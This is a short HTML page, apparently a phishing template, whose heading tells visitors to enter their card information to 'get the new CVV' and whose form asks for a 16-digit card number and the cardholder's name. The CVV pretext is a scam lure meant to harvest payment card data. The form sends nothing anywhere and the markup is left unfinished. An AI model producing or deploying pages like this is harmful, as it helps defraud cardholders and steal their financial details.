<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>thuan</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
   
    <div class="container">
        <img src="logo.png.png">
        <h1>PLEASE ENTER YOUR CARD INFORMATION TO GET THE NEW CVV</h1>
        <form>
            
            <label for="cardNumber">Card Number:</label>
            <input type="text" id="cardNumber"  required maxlength="16" pattern="\d{16}">
            
            <label for="cardHolder">Card Holder:</label>
            <input type="text" id="cardHolder" required maxlength="30">
            
            <button type="submit">CONFIRM</button>
        </form>
</body>
</html>
